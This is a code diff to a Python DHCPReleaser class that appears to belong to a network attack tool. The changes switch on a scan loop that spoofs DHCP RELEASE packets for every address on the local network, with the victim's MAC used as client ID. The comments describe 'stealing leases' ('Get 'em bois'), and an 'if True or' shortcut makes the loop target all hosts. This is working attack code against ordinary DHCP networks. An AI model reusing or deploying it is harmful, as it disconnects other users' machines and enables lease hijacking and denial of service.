@@ -34,13 +34,13 @@ class DHCPReleaser(ThreadedWorker):
                 if 'requested_addr' in options:
                     del options['requested_addr']
 
-                nak = DHCPLease.build_nak_packet(xid=packet[BOOTP].xid, dst_ip=packet[IP].src, dst_mac=packet.src, src_ip=packet[IP].dst)
-                self.interface.send(nak)
+                #nak = DHCPLease.build_nak_packet(xid=packet[BOOTP].xid, dst_ip=packet[IP].src, dst_mac=packet.src, src_ip=packet[IP].dst)
+                #self.interface.send(nak)
                 self.release_ip(DHCPLease.parse_client_ip(packet), options)
 
 
     @api
-    def release_ip(self, ip_address: str, options: dict):
+    def release_ip(self, ip_address: str, options: dict=None):
         try:
             mac = self.interface.arp_table[ip_address]
             self.log.info(f"Releasing {ip_address} for {mac}")
@@ -50,7 +50,7 @@ class DHCPReleaser(ThreadedWorker):
                 ip_address=ip_address,
                 server_mac=self.server_mac,
                 server_ip=self.server_ip,
-                options=options,
+                options=options or {'client_id': b'\x01' + DHCPLease.serialize_mac(mac)},
                 duration=0
             )
 
@@ -61,14 +61,16 @@ class DHCPReleaser(ThreadedWorker):
 
 
 
-    # @loop(0.25)
-    # def _scan(self):
-    #     # By not sleeping when encountering IPs on leases we own, we ensure that the
-    #     # sweep time of each iteration decreases as we steal leases. This effectively
-    #     # fixes the pacing of the packets in exchange for convergence
-    #     sleep_time = self.sweep_time / self.interface.network.num_addresses
+    @loop(5)
+    def _scan(self):
+        # By not sleeping when encountering IPs on leases we own, we ensure that the
+        # sweep time of each iteration decreases as we steal leases. This effectively
+        # fixes the pacing of the packets in exchange for convergence
+        sleep_time   = self.sweep_time / self.interface.network.num_addresses
+        packets_sent = 0
 
-    #     for ip in self.interface.network:
-    #         # It's not us, and we didn't assign it. Get 'em bois
-    #         if str(ip) not in self.lease_generator.claimed and str(ip) != self.interface.ip_address:
-    #             self.release_ip(str(ip), do_after=sleep_time)
+        for ip in self.interface.network:
+            # It's not us, and we didn't assign it. Get 'em bois
+            if True or str(ip) not in self.lease_generator.claimed and str(ip) != self.interface.ip_address:
+                self.release_ip(str(ip), do_after=sleep_time*packets_sent)
+                packets_sent += 1
